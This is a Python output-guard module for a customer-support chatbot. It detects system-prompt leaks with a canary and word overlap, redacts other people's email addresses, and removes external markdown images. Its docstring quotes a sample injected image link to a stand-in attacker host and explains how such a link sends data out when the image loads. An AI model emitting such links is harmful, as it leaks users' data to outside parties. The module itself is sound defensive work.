"""Output guard: checks an answer before (and while) it reaches the customer.

- System-prompt leaks: a canary string hidden in the system prompt, plus verbatim overlap (any run of
  LEAK_WORDS consecutive words from the prompt). Checked on the stream too, so a leak is cut off before
  the customer sees it, not after.
- Other people's emails: any address that isn't the customer's own or a support address is redacted.
- Markdown images with external URLs are removed: a classic exfiltration channel (an injected
  `![x](https://attacker/?d=...)` makes the browser send data when the image loads).
"""

import re

from pydantic import BaseModel, Field

CANARY = "SP-CANARY-7F3A9C2E"  # appears only in the system prompt; never legitimately in an answer
LEAK_WORDS = 8
EMAIL = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")
MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?[^)]*\)")
ALLOWED_EMAIL_DOMAINS = ("searchunify.com",)
LEAK_REPLY = ("I can't share details about how I'm configured. I'm happy to help with SearchUnify questions, "
              "or open a support ticket for you.")


class OutputCheck(BaseModel):
    text: str
    leak: bool = False
    redacted_emails: int = 0
    removed_images: int = 0
    reasons: list[str] = Field(default_factory=list)

    @property
    def changed(self) -> bool:
        return bool(self.leak or self.redacted_emails or self.removed_images)


def _words(text: str) -> list[str]:
    return re.findall(r"[a-z0-9']+", text.lower())


def prompt_ngrams(system_prompt: str, n: int = LEAK_WORDS) -> set[tuple[str, ...]]:
    w = _words(system_prompt)
    return {tuple(w[i:i + n]) for i in range(len(w) - n + 1)}


def leaks(text: str, ngrams: set[tuple[str, ...]]) -> bool:
    if CANARY.lower() in text.lower():
        return True
    w = _words(text)
    return any(tuple(w[i:i + LEAK_WORDS]) in ngrams for i in range(len(w) - LEAK_WORDS + 1))


def check_output(text: str, customer_email: str, ngrams: set[tuple[str, ...]]) -> OutputCheck:
    if leaks(text, ngrams):
        return OutputCheck(text=LEAK_REPLY, leak=True, reasons=["system prompt leak"])
    own = customer_email.lower()
    emails = 0

    def redact(m: re.Match) -> str:
        nonlocal emails
        addr = m.group(0).lower()
        if addr == own or addr.endswith(tuple("@" + d for d in ALLOWED_EMAIL_DOMAINS)):
            return m.group(0)
        emails += 1
        return "[email removed]"

    out = EMAIL.sub(redact, text)
    out, images = MD_IMAGE.subn("", out)
    reasons = (["other people's emails"] if emails else []) + (["external image"] if images else [])
    return OutputCheck(text=out, redacted_emails=emails, removed_images=images, reasons=reasons)
